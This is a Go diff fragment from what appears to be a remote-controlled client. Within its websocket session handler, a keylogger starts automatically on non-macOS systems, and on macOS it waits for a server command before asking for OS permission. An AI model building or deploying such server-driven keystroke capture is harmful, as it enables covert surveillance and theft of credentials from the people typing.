@@ -593,10 +593,19 @@ func runSession(ctx context.Context, cancel context.CancelFunc, conn *websocket.
 
 	env.Keylogger = keylogger.New()
 	if env.Keylogger != nil {
-		if err := env.Keylogger.Start(); err != nil {
-			log.Printf("[keylogger] Failed to start: %v", err)
-		} else {
+		if env.Keylogger.NeedsPermissionGate() {
+			// macOS: do NOT start automatically. The server must send
+			// keylog_request_permission first, which triggers the OS prompt.
+			// The keylogger will be started by the command handler once
+			// permission is granted.
 			defer env.Keylogger.Stop()
+			log.Printf("[keylogger] macOS permission gate active — waiting for server request")
+		} else {
+			if err := env.Keylogger.Start(); err != nil {
+				log.Printf("[keylogger] Failed to start: %v", err)
+			} else {
+				defer env.Keylogger.Stop()
+			}
 		}
 	}
 
